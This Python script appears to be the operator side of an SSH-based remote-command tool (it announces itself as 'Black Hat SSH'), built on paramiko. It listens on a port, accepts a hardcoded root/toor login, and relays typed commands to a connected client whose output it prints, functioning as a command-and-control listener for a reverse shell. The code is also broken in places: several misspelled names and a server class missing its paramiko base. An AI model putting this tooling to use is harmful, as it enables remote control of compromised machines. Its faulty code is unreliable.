import os
import paramiko
import socket
import sys
import threading

#host key sacado del repositorio de demos oficial de paramiko
host_key = paramkiko.RSAKey(filename='test_rsa.key')

class Server:
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if username == 'root' and password == 'toor':
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

def main():
    ip = '10.0.2.15'
    port = 2222
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((ip, port))
        sock.listen(50)
        print(" Listening for connection...")
        client, addr = sock.accept()
    except Exception as e:
        print ("Socket failed listening " + str(e))
        sys.exit(1)

    print("Connected!")

    try:
        session = paramiko.Transport(client)
        session.add_server_key(host_key)
        server = Server()
        session.start_server(server=server)

        chan = session.accept(20)
        if chan is None:
            print("No channel")
            sys.exit(1)
        print("Authentication Complete")
        print(chan.recv(1024))
        chan.send("Welcome to Black Hat SSH")
        while True:
            try:
                command = input("Enter command: ")
                if command != "exit":
                    chan.send(command)
                    print(chan.recv(1024).decode())
                else:
                    chan.send('exit')
                    print('Exiting')
                    session.close()
                    break
            except KeyBoardInterrrupt:
                session.close()
            except Exception as e:
                print("Exception raised: " + str(e))
                session.close()

main()
